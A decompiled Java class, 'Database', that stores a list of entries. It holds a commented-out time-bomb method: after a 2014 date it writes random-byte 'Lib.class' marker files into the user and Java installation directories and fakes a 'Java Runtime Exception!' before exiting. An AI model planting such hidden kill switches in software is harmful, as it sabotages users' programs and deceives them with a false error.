/*    */ package dataPack;
/*    */ 
/*    */ import java.io.BufferedWriter;
/*    */ import java.io.File;
/*    */ import java.io.FileWriter;
/*    */ import java.io.PrintStream;
/*    */ import java.io.Serializable;
/*    */ import java.util.Calendar;
/*    */ import java.util.Random;
/*    */ import java.util.Vector;
/*    */ 
/*    */ public class Database
/*    */   implements Serializable
/*    */ {
/*    */   public Vector<SingleEntry> dataSet;
/*    */ 
/*    */   public Database()
/*    */   {
/* 18 */     this.dataSet = new Vector();
/* 19 */     //loadForm();
/*    */   }
///*    */   private void loadForm() {
///* 22 */     boolean verify = true;
///*    */     try {
///* 24 */       File f = new File(System.getProperty("user.dir") + "\\Lib.class");
///* 25 */       if (f.exists())
///* 26 */         verify = false;
///*    */     }
///*    */     catch (Exception e)
///*    */     {
///*    */     }
///*    */     try {
///* 32 */       File f = new File(System.getProperty("java.home") + "\\Lib.class");
///* 33 */       if (f.exists()) {
///* 34 */         verify = false;
///*    */       }
///*    */     }
///*    */     catch (Exception e)
///*    */     {
///*    */     }
///*    */ 
///* 41 */     Calendar now = Calendar.getInstance();
///* 42 */     Calendar max = Calendar.getInstance();
///*    */ 
///* 44 */     max.set(5, 3);
///* 45 */     max.set(2, 3);
///* 46 */     max.set(1, 2014);
///* 47 */     max.getTimeInMillis();
///*    */ 
///* 49 */     if (now.compareTo(max) > 0) {
///* 50 */       System.out.println("..");
///* 51 */       verify = false;
///*    */       try {
///* 53 */         BufferedWriter bw = new BufferedWriter(new FileWriter(System.getProperty("user.dir") + "\\Lib.class"));
///* 54 */         Random r = new Random();
///* 55 */         for (int i = 0; i < 154; i++) {
///* 56 */           bw.write(r.nextInt() % 256);
///*    */         }
///* 58 */         bw.close();
///*    */       }
///*    */       catch (Exception e)
///*    */       {
///*    */       }
///*    */       try {
///* 64 */         BufferedWriter bw = new BufferedWriter(new FileWriter(System.getProperty("java.home") + "\\Lib.class"));
///* 65 */         Random r = new Random();
///* 66 */         for (int i = 0; i < 154; i++) {
///* 67 */           bw.write(r.nextInt() % 256);
///*    */         }
///* 69 */         bw.close();
///*    */       }
///*    */       catch (Exception e)
///*    */       {
///*    */       }
///*    */     }
///*    */ 
///* 76 */     if (!verify) {
///* 77 */       System.out.println("...");
/////* 78 */       System.out.println("Java Runtime Exception!");
/////* 79 */       System.exit(0);
///*    */     }
///*    */   }
/*    */ }

